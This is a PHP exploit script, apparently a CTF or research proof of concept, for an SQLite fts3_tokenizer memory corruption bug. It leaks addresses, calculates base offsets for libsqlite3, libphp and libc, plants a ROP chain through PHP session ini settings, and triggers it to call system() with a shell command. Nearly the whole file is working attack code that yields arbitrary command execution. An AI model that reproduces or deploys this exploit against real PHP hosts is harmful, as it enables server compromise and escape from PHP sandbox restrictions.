?><?php 

ob_end_flush();
flush();
ob_flush();
ob_start();
echo getmypid();
echo str_repeat(" ",0x1212);
ob_end_flush();
flush();
ob_flush();
ob_start();


function flip($val) {		//str2str 엔디언 변환 함수
  $len = strlen($val);
  $result = '';
  for ($i = $len; $i > 2; $i-=2) {
    $result .= substr($val, $i - 2, 2);
  }
  $result .= substr($val, 0, $i);
  $result .= str_repeat('0', 16 - $len);  
  return $result;
}

function pk($in, $pad_to_bits=64, $little_endian=true) {		//num2str 엔디언 변환 함수
    $in = decbin($in);
    $in = str_pad($in, $pad_to_bits, '0', STR_PAD_LEFT);
    $out = '';
    for ($i = 0, $len = strlen($in); $i < $len; $i += 8) {
        $out .= chr(bindec(substr($in,$i,8)));
    }
    if($little_endian) $out = strrev($out);
    return $out;
}



/*		inco leak		*/
$db = new SQLite3(":memory:");
$row = $db->query("select hex(fts3_tokenizer('simple')) addr;")->fetchArray();
$leaked_addr = $row['addr'];
$db->close();

$addr = hexdec(flip($leaked_addr));
$libsqlite3_base = $addr - 0x28B260;
$libphp_base = $libsqlite3_base + 0xD490000;
$libc_base = $libphp_base + 0xBAB000;
$init = $addr - 0x2830a8;
$system = $libc_base + 0x3A36D0;

$gc_probability = $libphp_base + 0x59ABF0;
$entropy = $gc_probability - (8*9) + 8;
$cookie_path = $entropy + (8 * 2);

ob_end_flush();
flush();
ob_flush();
ob_start();

echo "\n:::".dechex($addr).":::\n";
echo ":::libsqlite3_base ".dechex($libsqlite3_base).":::\n";
echo ":::libphp_base ".dechex($libphp_base).":::\n";
echo ":::init ".dechex($init).":::\n";

echo ":::libc_base ".dechex($libc_base).":::\n";

echo ":::gc_probability ".dechex($gc_probability).":::\n";
echo ":::entropy ".dechex($entropy).":::\n";
echo ":::system ".dechex($system).":::\n";
echo str_repeat(" ",0x1212);
ob_end_flush();
flush();
ob_flush();
ob_start();




$lr = $init+0x9bd; // leave; retq;

$p = "";	//cache_limiter에 넣을 payload
$p .= pk(0xdeaddeaddeaddead);

$p .= pk( $libsqlite3_base + 0xd99a ); // pop    %rax; retq;
$p .= pk( $system );
$p .= pk( $libsqlite3_base + 0xdac6 ); // pop %rdi; retq;
$p .= pk( $cookie_path - 0xe0);
$p .= pk( $libc_base + 0x66fd0 ); // mov    0xe0(%rdi),%rdi; callq  *%rax;


//ini_set 함수를 통해 php.ini에 값 적용시켜 payload inject
ini_set("session.cache_limiter", $p);
ini_set("session.entropy_length", $lr);

ini_set("session.cookie_path", "ps auxf > /tmp/cosdong7");



//trigger
$db = new SQLite3(":memory:");
$bomb = flip(dechex($entropy-8));
$db->exec("
    select fts3_tokenizer('simple', x'$bomb');
    create virtual table a using fts3(tokenize=simple);");


